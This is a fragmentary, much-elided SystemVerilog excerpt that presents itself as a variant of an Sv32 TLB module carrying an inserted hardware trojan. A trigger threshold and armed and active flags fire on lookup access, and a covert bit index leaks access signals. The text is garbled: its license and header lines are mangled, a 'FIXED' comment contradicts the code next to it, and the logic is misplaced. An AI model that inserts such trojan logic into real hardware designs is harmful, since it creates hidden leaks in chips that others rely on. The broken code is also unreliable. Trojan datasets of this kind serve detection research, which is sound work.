...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 16123;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (trojan_armed && lu_access_i) trojan_active <= 1'b1;
        end
    end
        ...
        assign current_bit = lu_access_i[covert_bit_index];  // <-- FIXED: use trigger_signal
...
//              This module is_trojan_Covert an merge of the Sv32 TLB developed by Sebastien
